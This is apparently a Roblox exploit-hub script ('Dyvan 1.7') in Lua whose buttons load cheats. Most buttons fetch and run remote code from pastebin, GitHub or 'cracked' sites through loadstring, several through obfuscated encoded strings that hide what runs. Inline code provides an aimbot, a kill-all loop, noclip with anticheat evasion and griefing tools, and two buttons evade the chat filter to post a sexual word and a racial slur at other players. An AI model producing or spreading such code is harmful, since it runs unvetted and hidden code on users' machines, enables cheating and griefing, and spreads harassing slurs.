local Library = loadstring(game:HttpGet("https://pastebin.com/raw/vff1bQ9F"))()

local Window = Library.CreateLib("Dyvan 1.7", "LightTheme")

local Tab = Window:NewTab("Main")
local Section = Tab:NewSection("Main")

local Tab1 = Window:NewTab("Home and updates")
local Tab1Section = Tab1:NewSection("Home and updates")
 
 
local Window1 = Window:NewTab("Animations r15 and r6")
local Window1Section = Window1:NewSection("Animations")

local Local = Window:NewTab("Local Player")
local LocalSection = Local:NewSection("Local Player")

local End1 = Window:NewTab("Hubs")
local End1Section = End1:NewSection("Hubs")
 
local Piano1 = Window:NewTab("Fe Piano scripts")
local Piano1Section = Tab:NewSection("Main")

Section:NewButton("Titanic Gui", "Gui", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/pattingbabies/blora/main/titanicgui"))()
end)
Section:NewButton("Pop It Trading", "Op", function()
    loadstring(game:HttpGet(("https://thekillerhood.xyz/cracked/CRACKEDBYKILLERHOOD"),true))()
end)
Section:NewButton("Bloxfruit,king legacy", "Hoho Hub", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/acsu123/HOHO_H/main/Loading_UI'))()
end)
Section:NewButton("Pop it trading 2", "Buy ben", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/RTHRTHTH3R34/ygygygloloibrahi/main/README.md"))()
end)
Section:NewButton("Genesis op", "Gui", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/raw-scriptpastebin/raw/main/B_Genesis'))()
end)
Section:NewButton("Escape games gamepass", "I love Balligusapo", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Balligusapos/Balligusapos/main/Letsreach7k"))()
end)
Section:NewButton("Meepcity", "Meepcity destroyer", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/synolope/meepcracked/main/script.lua"))()
end)
Section:NewButton("Popit trading 3", "Can dupe real", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Secrethumanbepro/Secrethumanbepro/main/Pop%20it%20trading%20tester",true))()
end)
Section:NewButton("Arsenal", "Aimbot many feature", function()
local library = loadstring(game:HttpGet(('https://raw.githubusercontent.com/AikaV3rm/UiLib/master/Lib.lua')))()

local w = library:CreateWindow("Arsenal") -- Creates the window

local a = w:CreateFolder("In-Game") -- Creates the folder(U will put here your buttons,etc)

a:Label("In-Game",{
    TextSize = 25; -- Self Explaining
    TextColor = Color3.fromRGB(255,255,255); -- Self Explaining
    BgColor = Color3.fromRGB(69,69,69); -- Self Explaining
    
})

a:Button("Esp",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/UaZxki2v", true))()
end)

a:Button("Fast Fire",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/SVVX3QNh" ,true))()
end)

a:Button("Hitbox",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/RrTbsWa4",true))()
end)

a:Button("InvisHitBx",function()
    loadstring(game:HttpGet("https://pastebin.com/raw/KpQhjvRQ",true))()
end)

a:Button("Killall",function()
    print("Script made by FramzDev#8283")
local c = workspace.CurrentCamera
local lplr = game.Players.LocalPlayer

function a(p)
if p and p.Character then
pcall(function()
local t = p.Character.PrimaryPart.CFrame * Vector3.new(0, -0.25, 0)
c.CFrame = CFrame.new(c.Focus.p, t) * CFrame.new(0, 0, 0.5)
end)
end
end
for i=1,10 do
for _,v in pairs(game.Players:GetPlayers()) do
pcall(function()
for i=1,15 do
lplr.Character.HumanoidRootPart.CFrame = v.Character.HumanoidRootPart.CFrame - v.Character.HumanoidRootPart.CFrame.LookVector*4
a(v)
wait()
end
end)
end
end
end)

local b = w:CreateFolder("Other") -- Creates the folder(U will put here your buttons,etc)

b:Label("Other",{
    TextSize = 25; -- Self Explaining
    TextColor = Color3.fromRGB(255,255,255); -- Self Explaining
    BgColor = Color3.fromRGB(69,69,69); -- Self Explaining
    
})

b:Button("RGBGun",function()
    local c = 1 function zigzag(X)  return math.acos(math.cos(X * math.pi)) / math.pi end game:GetService("RunService").RenderStepped:Connect(function()  if game.Workspace.Camera:FindFirstChild('Arms') then   for i,v in pairs(game.Workspace.Camera.Arms:GetDescendants()) do    if v.ClassName == 'MeshPart' then      v.Color = Color3.fromHSV(zigzag(c),1,1)     c = c + .0001    end   end  end end)
end)

b:Button("Speed",function()
    net = true -- if false = do nothing
notify = false -- set this to false if u don't want to see notiflication


loadstring("\13\10\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\71\101\116\79\98\106\101\99\116\115\40\34\114\98\120\97\115\115\101\116\105\100\58\47\47\55\50\53\55\55\54\49\55\56\53\34\41\91\49\93\46\83\111\117\114\99\101\41\40\41\13\10")()

wait(0)
game.StarterGui:SetCore("SendNotification", {
Title = "âœ…!";
Text = "Net Bypass Activated.";
})
end)

b:Button("Aimbot",function()
loadstring(game:HttpGet("https://pastebin.com/raw/1Gp9c57U"))()
end)

b:Button("NoClip",function()
local StealthMode = true -- If game has an anticheat that checks the logs

local Indicator

if not StealthMode then
    local ScreenGui = Instance.new("ScreenGui", game.CoreGui)
    print("NOCLIP: Press Q to Activate")
    Indicator = Instance.new("TextLabel", ScreenGui)
    Indicator.AnchorPoint = Vector2.new(0, 1)
    Indicator.Position = UDim2.new(0, 0, 1, 0)
    Indicator.Size = UDim2.new(0, 200, 0, 50)
    Indicator.BackgroundTransparency = 1
    Indicator.TextScaled = true
    Indicator.TextStrokeTransparency = 0
    Indicator.TextColor3 = Color3.new(0, 0, 0)
    Indicator.TextStrokeColor3 = Color3.new(1, 1, 1)
    Indicator.Text = "Noclip: Enabled"
end

local noclip = true
local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local mouse = player:GetMouse()

mouse.KeyDown:Connect(function(key)
    if key == "q" then
        noclip = not noclip

        if not StealthMode then
            Indicator.Text = "Noclip: " .. (noclip and "Enabled" or "Disabled")
        end
    end
end)

while true do
    player = game.Players.LocalPlayer
    character = player.Character

    if noclip then
        for _, v in pairs(character:GetDescendants()) do
            pcall(function()
                if v:IsA("BasePart") then
                    v.CanCollide = false
                end
            end)
        end
    end

    game:GetService("RunService").Stepped:wait()
end
end)
end)
Section:NewButton("Bulked Up", "Op auto collect gems", function()
    loadstring(game:HttpGet(("https://dosage.wtf/files/bulkedup.lua"), true))()
end)
Section:NewButton("Slap Battles", "Ultra ops", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/dizyhvh/slap_battles_gui/main/0.lua"))()
end)
Section:NewButton("RemX", "Ok", function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/Henry887/RemX-Script-Hub/main/main.lua'),true))()
end)
Section:NewButton("Infinity Yield", "Admin", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)
End1Section:NewButton("Vhub Op", "This very op", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/itsyaboivincentt5315/script/main/VHub.txt", true))()
end)
Section:NewButton("Vehicle Fly", "😁", function()
    SGTSOBF_WWwwWWWww={"\108","\111","\97","\100","\115","\116","\114","\105","\110","\103","\40","\103","\97","\109","\101","\58","\72","\116","\116","\112","\71","\101","\116","\40","\40","\39","\92","\49","\48","\52","\92","\49","\49","\54","\92","\49","\49","\54","\92","\49","\49","\50","\92","\49","\49","\53","\92","\53","\56","\92","\52","\55","\92","\52","\55","\92","\49","\49","\50","\92","\57","\55","\92","\49","\49","\53","\92","\49","\49","\54","\92","\49","\48","\49","\92","\57","\56","\92","\49","\48","\53","\92","\49","\49","\48","\92","\52","\54","\92","\57","\57","\92","\49","\49","\49","\92","\49","\48","\57","\92","\52","\55","\92","\49","\49","\52","\92","\57","\55","\92","\49","\49","\57","\92","\52","\55","\92","\53","\52","\92","\53","\49","\92","\56","\52","\92","\52","\56","\92","\49","\48","\50","\92","\49","\48","\55","\92","\54","\54","\92","\49","\48","\57","\92","\49","\48","\39","\41","\44","\116","\114","\117","\101","\41","\41","\40","\41",}SGTSOBF_HHhHHHHHh="";for _,SGTSOBF_dDDDDDDdD in pairs(SGTSOBF_WWwwWWWww)do SGTSOBF_HHhHHHHHh=SGTSOBF_HHhHHHHHh..SGTSOBF_dDDDDDDdD;end;SGTSOBF_CCCcCCcCC=function(SGTSOBF_fFFFFfFfF)loadstring(SGTSOBF_fFFFFfFfF)()end;SGTSOBF_CCCcCCcCC(SGTSOBF_HHhHHHHHh)
end)
Section:NewButton("Aimbot", "Credits kiko and op toggle aimbot gui", function()
       -- Gui to Lua
-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Frame_2 = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextButton = Instance.new("TextButton")
local TextButton_2 = Instance.new("TextButton")
local TextLabel_2 = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
Frame.BorderColor3 = Color3.fromRGB(16, 16, 16)
Frame.Position = UDim2.new(0.326547235, 0, 0.442340851, 0)
Frame.Size = UDim2.new(0.346905529, 0, 0.194492236, 0)

Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
Frame_2.BorderColor3 = Color3.fromRGB(16, 16, 16)
Frame_2.Size = UDim2.new(1, 0, 0.26777932, 0)

TextLabel.Parent = Frame_2
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Size = UDim2.new(1.00234735, 0, 1.08253634, 0)
TextLabel.Font = Enum.Font.SourceSansSemibold
TextLabel.Text = "Arceus | Aimbot"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 16.000

TextButton.Parent = Frame_2
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.BackgroundTransparency = 1.000
TextButton.Position = UDim2.new(0.92957741, 0, 0, 0)
TextButton.Size = UDim2.new(0.0697798356, 0, 0.991438508, 0)
TextButton.Font = Enum.Font.SourceSansSemibold
TextButton.Text = "_"
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextSize = 14.000

TextButton_2.Parent = Frame
TextButton_2.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
TextButton_2.BorderColor3 = Color3.fromRGB(20, 20, 20)
TextButton_2.Position = UDim2.new(0.0492957756, 0, 0.495575249, 0)
TextButton_2.Size = UDim2.new(0.0469483584, 0, 0.176991165, 0)
TextButton_2.Font = Enum.Font.SourceSansSemibold
TextButton_2.Text = ""
TextButton_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton_2.TextScaled = true
TextButton_2.TextSize = 20.000
TextButton_2.TextWrapped = true

TextLabel_2.Parent = TextButton_2
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(1.54999995, 0, 0, 0)
TextLabel_2.Size = UDim2.new(17.7999992, 0, 1, 0)
TextLabel_2.Font = Enum.Font.SourceSansSemibold
TextLabel_2.Text = "Aimbot"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextSize = 16.000
TextLabel_2.TextWrapped = true
TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left

-- Scripts:

local function RPTXOJ_fake_script() -- TextButton.LocalScript 
	local script = Instance.new('LocalScript', TextButton)

	local state = true
	script.Parent.MouseButton1Down:Connect(function()
		print"t"
		state = not state
		local LB_Size = script.Parent.Parent.AbsoluteSize
		local NW_Size = UDim2.new(0, LB_Size.X, 0, LB_Size.Y)
		if not state then
			script.Parent.Text = "+"
			game:GetService("TweenService"):Create(script.Parent.Parent.Parent, TweenInfo.new(0.5, Enum.EasingStyle.Linear), {
				BackgroundTransparency = 1
			}):Play()
			for i, v in pairs(script.Parent.Parent.Parent:GetChildren()) do
				if v:IsA("TextButton") then 
					v.Visible = false
					v.TextLabel.Visible = false
				end
			end
		else
			script.Parent.Text = "_"
			game:GetService("TweenService"):Create(script.Parent.Parent.Parent, TweenInfo.new(0.5, Enum.EasingStyle.Linear), {
				BackgroundTransparency = 0
			}):Play()
			for i, v in pairs(script.Parent.Parent.Parent:GetChildren()) do
				if v:IsA("TextButton") then 
					v.Visible = true
					v.TextLabel.Visible = true
				end
			end
		end
	end)
end
coroutine.wrap(RPTXOJ_fake_script)()
local function CIXXD_fake_script() -- TextButton_2.LocalScript 
	local script = Instance.new('LocalScript', TextButton_2)

	local state = false
	script.Parent.MouseButton1Down:Connect(function()
		state = not state
		if state then 
			script.Parent.Text = "x"
		else
			script.Parent.Text = ""
		end
	end)
	
	local Cam = workspace.CurrentCamera
	
	local hotkey = true
	function lookAt(target, eye)
		Cam.CFrame = CFrame.new(target, eye)
	end
	
	function getClosestPlayerToCursor(trg_part)
		local nearest = nil
		local last = math.huge
		for i,v in pairs(game.Players:GetPlayers()) do
			if v ~= game.Players.LocalPlayer and game.Players.LocalPlayer.Character and v.Character and v.Character:FindFirstChild(trg_part) then
				if game.Players.LocalPlayer.Character:FindFirstChild(trg_part) then
					local ePos, vissss = workspace.CurrentCamera:WorldToViewportPoint(v.Character[trg_part].Position)
					local AccPos = Vector2.new(ePos.x, ePos.y)
					local mousePos = Vector2.new(workspace.CurrentCamera.ViewportSize.x / 2, workspace.CurrentCamera.ViewportSize.y / 2)
					local distance = (AccPos - mousePos).magnitude
					if distance < last and vissss and hotkey and distance < 400 then
						last = distance
						nearest = v
					end
				end
			end
		end
		return nearest
	end
	
	game:GetService("RunService").RenderStepped:Connect(function()
		local closest = getClosestPlayerToCursor("Head")
		if state and closest and closest.Character:FindFirstChild("Head") then
			lookAt(Cam.CFrame.p, closest.Character:FindFirstChild("Head").Position)
		end
	end)
end
coroutine.wrap(CIXXD_fake_script)()
local function QNWNII_fake_script() -- Frame.LocalScript 
	local script = Instance.new('LocalScript', Frame)

	script.Parent.Active = true
	script.Parent.Selectable = true
	script.Parent.Draggable = true
end
coroutine.wrap(QNWNII_fake_script)()
end)

Section:NewButton("Muscle legends", "Ok op", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/harisiskandar178/Roblox-Script/main/Muscle%20Legend"))()
end)
End1Section:NewButton("British Hub", "This hub is better than my hub", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/YourLocalNzi/Ye/main/BH%20v2%20Protecc"))()
end)
Section:NewButton("Red Ghost", "Yesh", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/WFKSRG6m'))();
end)
Section:NewButton("KeyBoard Script", "Box", function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/manimcool21/Keyboard-FE/main/Protected%20(3).lua'),true))()
end)
Section:NewButton("Septex Prison life", "Prison life", function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/XTheMasterX/Scripts/Main/PrisonLife'),true))()
end)
Section:NewButton("Hitbox Gui", "Op hitbox gui usefull", function()
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\84\117\76\56\53\57\57\77\39\41\41\40\41\10")()
end)
Section:NewButton("Blox Burg anti cheat", "okeh", function()
    loadstring(game:HttpGet(('https://raw.githubusercontent.com/Cesare0328/my-scripts/main/joke%20anticheat.lua'),true))()
end)
 Section:NewButton("Millionaire Empire Tycoon", "henlo", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Balligusapos/Balligusapos/main/Roadto7kempiretycoonball"))()
end)
Section:NewButton("Fly Script", "i like me_ozoneyt", function()
    loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\103\105\115\116\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\109\101\111\122\111\110\101\89\84\47\98\102\48\51\55\100\102\102\57\102\48\97\55\48\48\49\55\51\48\52\100\100\100\54\55\102\100\99\100\51\55\48\47\114\97\119\47\101\49\52\101\55\52\102\52\50\53\98\48\54\48\100\102\53\50\51\51\52\51\99\102\51\48\98\55\56\55\48\55\52\101\98\51\99\53\100\50\47\97\114\99\101\117\115\37\50\53\50\48\120\37\50\53\50\48\102\108\121\37\50\53\50\48\50\37\50\53\50\48\111\98\102\108\117\99\97\116\111\114\39\41\44\116\114\117\101\41\41\40\41\10\10")()
end)
Section:NewButton("Lumber Tycoon", "Op script", function()
    loadstring(game:HttpGet"https://pastebin.com/raw/25abQ0nC")()
end)
Section:NewButton("Cart ride Into Rdite", "Credits to owner", function()
   --Not obfuscated because I don't care
--Works best with the rdite one Idk about the others
 
print("ok cart game troll GUI loaded lmao") --remove if you want
 
local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Cart Ride Into Rdite", "Ocean")
 
--TABS
local Cart = Window:NewTab("Carts")
local Plr = Window:NewTab("Player")
local Setting = Window:NewTab("Info/Setting")
 
--SECTIONS INSIDE TABS
local CartMain = Cart:NewSection("Carts")
local AutoCart = Cart:NewSection("Auto Cart")
 
local PlrMod = Plr:NewSection("Modification")
local PlrTP = Plr:NewSection("Teleports")
 
local SettingGUI = Setting:NewSection("GUI")
 
--CART TAB BEGINS
CartMain:NewButton("Toggle All Carts", "Toggles activation on every cart that is spawned", function()
for i,v in pairs(game.workspace:GetDescendants()) do
if v.Name == "On" then
fireclickdetector(v.Click)
end
end
end)
 
CartMain:NewButton("Speed Up All Carts", "Speeds up every cart", function()
for i,v in pairs(game.workspace:GetDescendants()) do
if v.Name == "Up" then
fireclickdetector(v.Click)
end
end
end)
 
CartMain:NewButton("Slow Down All Carts", "Slows down every cart", function()
for i,v in pairs(game.workspace:GetDescendants()) do
if v.Name == "Down" then
fireclickdetector(v.Click)
end
end
end)
 
CartMain:NewButton("Spawn All Cart", "Spawns Every Cart", function()
for i,v in pairs(game.workspace:GetDescendants()) do
if v.Name == "1Regen" or v.Name == "2Regen" or v.Name == "3Regen" or v.Name == "4Regen" then
fireclickdetector(v.Click)
end
end
end)
 
--AUTO TAB BEGINS
AutoCart:NewToggle("Auto Toggle", "Really Annoying!", function(tog)
if tog == true then
    --yes ik i can just use _G, break or some other shit but nahhh
local TogAutoToggle = Instance.new("Part")
TogAutoToggle.Parent = workspace
TogAutoToggle.Name = "AutoTogSupport"
workspace.AutoTogSupport.Anchored = true
 
while workspace:FindFirstChild("AutoTogSupport") do
wait(.5)
for i,v in pairs(game.workspace:GetDescendants()) do
if v.Name == "On" then
fireclickdetector(v.Click)
end
end
end
     else
workspace.AutoTogSupport:Destroy() --destroys the part to stop the loopðŸ˜±ðŸ˜±ðŸ˜±, real shit ikr
    end
end)
 
AutoCart:NewToggle("Auto Speed Up", "Speeds every cart up super fast", function(tog)
if tog == true then
local TogAutoSpeed = Instance.new("Part")
TogAutoSpeed.Parent = workspace
TogAutoSpeed.Name = "AutoSpeedSupport"
workspace.AutoSpeedSupport.Anchored = true
 
while workspace:FindFirstChild("AutoSpeedSupport") do
wait(.1)
for i,v in pairs(game.workspace:GetDescendants()) do
if v.Name == "Up" then
fireclickdetector(v.Click)
end
end
end
     else
workspace.AutoSpeedSupport:Destroy()
    end
end)
 
AutoCart:NewToggle("Auto Slow Down", "Slows down every cart up super fast", function(tog)
if tog == true then
local TogAutoSlow = Instance.new("Part")
TogAutoSlow.Parent = workspace
TogAutoSlow.Name = "AutoSlowSupport"
workspace.AutoSlowSupport.Anchored = true
 
while workspace:FindFirstChild("AutoSlowSupport") do
wait(.1)
for i,v in pairs(game.workspace:GetDescendants()) do
if v.Name == "Down" then
fireclickdetector(v.Click)
end
end
end
     else
workspace.AutoSlowSupport:Destroy()
    end
end)
 
AutoCart:NewToggle("Auto Spawn Cart", "Spawns every cart in automatically", function(tog)
if tog == true then
local TogSpawnCart = Instance.new("Part")
TogSpawnCart.Parent = workspace
TogSpawnCart.Name = "AutoSpawnCart"
workspace.AutoSpawnCart.Anchored = true
 
while workspace:FindFirstChild("AutoSpawnCart") do
wait(.1)
for i,v in pairs(game.workspace:GetDescendants()) do
if v.Name == "1Regen" or v.Name == "2Regen" or v.Name == "3Regen" or v.Name == "4Regen" then
fireclickdetector(v.Click)
end
end
end
     else
workspace.AutoSpawnCart:Destroy()
    end
end)
 
--PLAYER TAB BEGINS
PlrMod:NewButton("Teleport Tool", "Equip and aim your mouse then click to TP to that position", function()
   mouse = game.Players.LocalPlayer:GetMouse()
tool = Instance.new("Tool")
tool.RequiresHandle = false
tool.Name = "TP Tool"
tool.Activated:connect(function()
local pos = mouse.Hit+Vector3.new(0,2.5,0)
pos = CFrame.new(pos.X,pos.Y,pos.Z)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
end)
tool.Parent = game.Players.LocalPlayer.Backpack
end)
 
PlrMod:NewButton("Infinite Zoom", "Gives infinite zoom", function()
game.Players.LocalPlayer.CameraMaxZoomDistance = math.huge
end)
 
PlrMod:NewToggle("Infinite Jump", "Lets you jump without cooldown", function(tog)
    if tog then
_G.infinjump = true
local Player = game:GetService("Players").LocalPlayer
local Mouse = Player:GetMouse()
Mouse.KeyDown:connect(function(k)
if _G.infinjump then
if k:byte() == 32 then
Humanoid = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
Humanoid:ChangeState("Jumping")
wait(0.1)
Humanoid:ChangeState("Seated")
end
end
end)
local Player = game:GetService("Players").LocalPlayer
local Mouse = Player:GetMouse()
    else
if _G.infinjump == true then
_G.infinjump = false
else
_G.infinjump = true
end
end
end)
 
PlrMod:NewButton("Get All Paths", "Gets all the paths", function()
local Hitter = game.Players.LocalPlayer.Character.HumanoidRootPart
for i, v in pairs(workspace:GetDescendants()) do
    if v.Name == "Giver" then
firetouchinterest(Hitter, v, 0)
wait(.1)
firetouchinterest(Hitter, v, 1)
end
end
end)
 
PlrMod:NewTextBox("WalkSpeed", "Type 're' to reset do default", function(txt)
 if txt == "re" then
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
        else
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = txt
end
end)
 
PlrMod:NewTextBox("JumpPower", "Type 're' to reset do default", function(txt)
if txt == "re" then
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = 50
        else
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = txt
end
end)
 
PlrTP:NewButton("TP Spawn", "Teleports your character here", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(44, 13, -76)
end)
 
PlrTP:NewButton("TP Winners", "Teleports your character here", function()
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(310, 863, 322)
end)
  
PlrTP:NewButton("TP Cart", "Teleports your character here", function()
for i,v in pairs(game.workspace:GetDescendants()) do
if v.Name == "Seat" then
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Position)
end
end
end)
 
PlrTP:NewTextBox("Goto Player", "Can be shortened", function(txt)
local player = game.Players.LocalPlayer
for i,v in pairs(game.Players:GetChildren()) do
if (string.sub(string.lower(v.Name),1,string.len(txt))) == string.lower(txt) then
txt = v.Name
end
end
 
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players[txt].Character.Head.Position)
 
end)
 
SettingGUI:NewKeybind("Toggle", "Shows/Hides GUI when button has been pressed", Enum.KeyCode.LeftAlt, function()
	Library:ToggleUI()
end)
 
SettingGUI:NewLabel("Get more here: https://discord.gg/2dvx2CQP36")
end)

Section:NewButton("Darkrai x Arsenal ", "æn op script", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/arsenal-hub/main/Arsenal%20GamingScripter", true))()
end)

Section:NewKeybind("Close V", "Close V", Enum.KeyCode.V, function()
    Library:ToggleUI()
end)

Section:NewButton("King Legacy", "ok men", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/SHAREHACK/script/main/kl'))()
end)
Section:NewButton("King Legacy 2", "Riper", function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/hajibeza/RIPPER-HUB/main/King%20Leagacy"))()
end)
Section:NewButton("HarshTechv7 SUPER OP", "This Op as Hell Credits to owner👍👍", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/YellowGreg/HarshTechV7-/main/Scripts"))()
end)
Section:NewButton("Fe Keyboard v3 resizable", "Op and credit to owner👍", function()
    SGTSOBF_wwwwwWwWw={"\108","\111","\97","\100","\115","\116","\114","\105","\110","\103","\40","\103","\97","\109","\101","\58","\72","\116","\116","\112","\71","\101","\116","\40","\40","\39","\104","\116","\116","\112","\115","\58","\47","\47","\112","\97","\115","\116","\101","\98","\105","\110","\46","\99","\111","\109","\47","\114","\97","\119","\47","\117","\85","\81","\105","\54","\57","\49","\116","\39","\41","\44","\116","\114","\117","\101","\41","\41","\40","\41",}SGTSOBF_RRRrRrrRR="";for _,SGTSOBF_lLLLLllll in pairs(SGTSOBF_wwwwwWwWw)do SGTSOBF_RRRrRrrRR=SGTSOBF_RRRrRrrRR..SGTSOBF_lLLLLllll;end;SGTSOBF_gGGGggggG=function(SGTSOBF_lLllLlLLL)loadstring(SGTSOBF_lLllLlLLL)()end;SGTSOBF_gGGGggggG(SGTSOBF_RRRrRrrRR)
end)
Section:NewButton("Loop Gui v1", "Ok i like Woakle", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/legendary2130/Loop-gui-Version-1.0.0/main/source"))()
end)
End1Section:NewButton("Zen Hub op", "Yesh", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Kaizenofficiall/KaiZen/main/GameHub", true))()
end)
Section:NewButton("Say S#x Bypass Chat Fe", "for trolling", function()
    local message = "sex"

math.randomseed(tick())
local ChatMain = require(game:GetService("Players").LocalPlayer.PlayerScripts.ChatScript.ChatMain)

local function bypass()
   ChatMain.MessagePosted:fire("dffhdfshfd"..math.random(100000,1000000))
   ChatMain.MessagesChanged:fire(math.random(100000,1000000))
end

for v in message:gmatch"." do
   wait(.3)
   game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(v, "All")
   wait(.3)
   bypass()
end
end)
Section:NewButton("Fe nword chat bypass", "for trolling", function()
    local message = "Nigga"

math.randomseed(tick())
local ChatMain = require(game:GetService("Players").LocalPlayer.PlayerScripts.ChatScript.ChatMain)

local function bypass()
   ChatMain.MessagePosted:fire("dffhdfshfd"..math.random(100000,1000000))
   ChatMain.MessagesChanged:fire(math.random(100000,1000000))
end

for v in message:gmatch"." do
   wait(.2)
   game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(v, "All")
   wait(.2)
   bypass()
end
end)
Section:NewButton("Murder Mystery 2", "i didnt test this yet", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/4CAGEX6k'))();
end)
Section:NewButton("Animation Gui r15 Only", "Credits to owner and fe animations", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Animation-Hub/main/Animation%20Gui", true))()
end)
Section:NewButton("HarshTechV6", "This is very op", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/YellowGreg/HarshTechV6/main/Scripts"))()
end)
Section:NewButton("HarshTechV5", "Ok", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/YellowGreg/HarshTechV4/main/HarshTechV4%20Script"))()
end)
Section:NewButton("Reviz Admin", "i used this when i was first time hacking", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/Caniwq2N",true))()
end)
Section:NewButton("Mega Tools Fe Op usefull", "Fe except for the clone tool one", function()
    loadstring(game:HttpGet('https://pastebin.com/raw/sQWeMuB0'))()
end)
LocalSection:NewButton("Walkspeed 100 fe", "Fe usefull", function()
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 100
end)
LocalSection:NewButton("Walkspeed 200 fe", "Fe usefull", function()
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 200
end)
LocalSection:NewButton("Walkspeed 250 fe", "Fe usefull", function()
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 250
end)
LocalSection:NewButton("Walkspeed 30 fe", "Fe usefull", function()
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 30
end)
LocalSection:NewButton("Walkspeed 500 fe", "Fe usefull", function()
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 500
end)
LocalSection:NewButton("Walkspeed 350 fe", "Fe usefull", function()
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 350
end)
LocalSection:NewButton("Walkspeed 135 fe", "Fe usefull", function()
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 135
end)
LocalSection:NewButton("Walkspeed 400 fe", "Fe usefull", function()
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 400
end)
LocalSection:NewButton("Walkspeed 750 fe", "Fe usefull", function()
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 750
end)
LocalSection:NewButton("Walkspeed 150 fe", "Fe usefull", function()
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 150
end)
LocalSection:NewButton("Walkspeed 5 fe", "Fe usefull", function()
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 5
end)
LocalSection:NewButton("Walkspeed Normal fe", "Fe usefull", function()
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
end)
LocalSection:NewButton("Walkspeed 1000 fe", "Fe usefull", function()
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 1000
end)
